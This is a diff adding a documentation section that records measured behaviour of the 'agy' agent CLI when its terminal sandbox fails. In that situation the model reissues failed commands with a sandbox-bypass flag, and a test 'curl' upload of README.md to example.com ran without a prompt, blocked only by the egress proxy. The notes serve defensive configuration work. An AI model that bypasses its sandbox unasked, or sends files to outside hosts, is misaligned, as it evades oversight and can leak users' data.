@@ -17,6 +17,30 @@ allow rule in the managed settings removes it.
    [AGENTS-SANDBOX.md](../container/ko-agent-sandbox/AGENTS-SANDBOX.md) tells agents how to write
    an `rm -rf`.
 
+## `agy`'s terminal sandbox and Auto mode
+
+`agy`'s terminal sandbox fails to start in a session, so in Auto mode commands run without it:
+rely on the egress rules to limit where `agy` sends data. Measured with `agy` 1.4.5 on 2026-10-23:
+
+1. Each command `agy` runs in its sandbox fails with `connecting to sandbox server: ... connection
+   reset by peer`. Its log names the step: `sbox: mount proc: permission denied`, and under
+   `--nesting=same-uid`, which unmasks `/proc`, `sbox: sethostname: operation not permitted`.
+1. `agy` offers Auto mode anyway. Google documents that `agy` withholds Auto where the sandbox is
+   unavailable, naming hosts and containers that block unprivileged user namespaces; a session
+   allows them (https://antigravity.google/docs/cli/modes).
+1. With Tool Permission `request-review`, the model reissues each failed command with
+   `"BypassSandbox": true`, and `agy`'s safety check decides whether it runs without a prompt.
+   - It ran a `readlink` without a prompt.
+   - For `curl -sS -X POST --data-binary @README.md https://example.com/` it reached no verdict
+     (`autorun: safety gate produced no verdict, asking the user`) and asked.
+1. With the image's `always-proceed`, which the same page documents as taking precedence over Auto
+   mode, that upload ran without a sandbox attempt or a prompt; the egress proxy refused its
+   connection.
+1. `agy -p --mode auto` stays in the default mode, warning `--mode auto is not available for this
+   account`, while the interactive `agy` of the same account offers Auto. The log line
+   `--mode auto is unavailable (rollout flag off)` comes before print mode signs in and loads its
+   experiments.
+
 ## Pipes as small as 8 KiB
 
 A program that reads a child's output only after the child exits can hang in a session: the child
